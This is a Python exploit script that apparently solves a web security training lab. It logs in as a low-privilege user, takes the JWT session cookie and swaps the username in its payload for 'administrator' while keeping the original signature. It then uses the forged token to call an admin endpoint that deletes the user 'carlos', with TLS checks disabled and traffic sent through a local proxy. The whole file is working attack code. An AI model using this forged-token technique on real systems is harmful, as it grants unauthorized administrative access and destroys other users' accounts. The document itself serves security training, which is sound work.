import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf(url:str, s: requests.Session):
    try:
        req = s.get(url + '/login', proxies=proxies, verify=False, timeout=3)
        soup = BeautifulSoup(req.text,'html.parser')
        csrf = soup.find("input", {'name': 'csrf'})['value']
        return csrf
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return None

def login(url:str, s:requests.Session, csrf:str, username:str, password:str):
    try:
        body = {'csrf': csrf, 'username': username, 'password': password}
        #allow-redirects is False because the response for the login is 302 and we need to extract the JWT
        req = s.post(url + '/login', data=body, proxies=proxies, verify=False, timeout=3, allow_redirects=False)
        
        if req.status_code == 302:
            print("Logged in successfully")
            #the jwt is stored in the session cookies
            jwt = req.cookies['session']
            return jwt
        else:
            print("Could not extract JWT")
            return None
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return None

def attack_jwt_signature(url: str, user_jwt: str):
    header, payload, signature = user_jwt.split('.')
    
    #Many web services, tokens, and frameworks (like JWTs) strip out the trailing equal signs (=) from the URL-safe Base64 string
    #If you pass a stripped string into Python's decoder, it will throw a binascii.Error: Incorrect padding.
    decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))

    modified_payload = decoded_payload.replace(b'wiener', b'administrator')
    modified_payload_encoded = base64.urlsafe_b64encode(modified_payload).decode()
    modified_token = f"{header}.{modified_payload_encoded}.{signature}"
    return modified_token

def delete_carlos(url:str, s:requests.Session, modified_token:str):
    cookies = {'session': modified_token}
    try:
        req = s.get(url + '/admin/delete?username=carlos', cookies=cookies, proxies=proxies, verify=False, timeout=3)
        if 'User deleted successfully' in req.text:
            print("Carlos deleted successfully!")
            return True
        else:
            print("Could not delete carlos")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Error when passing arguments\n{sys.argv[0]} <url>")
        sys.exit(-1)
    
    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')
    
    username = "wiener"
    password = "peter"

    s = requests.Session()

    csrf = get_csrf(url, s)
    if not csrf:
        print("Error in extracting csrf")
        sys.exit(-1)

    user_jwt = login(url, s, csrf, username, password)
    if not user_jwt:
        sys.exit(-1)
    
    modified_token = attack_jwt_signature(url, user_jwt)
    if modified_token:
        print(f"Admin token is:\n{modified_token}")
    else:
        print("Failed to generate admin token")
        sys.exit(-1)
    
    print("Deleting user carlos")
    if delete_carlos(url, s, modified_token):
        print("Lab Solved!!")
        sys.exit(0)
    else:
        print("Failed to solve the lab")
        sys.exit(-1)

if __name__ == "__main__":
    main()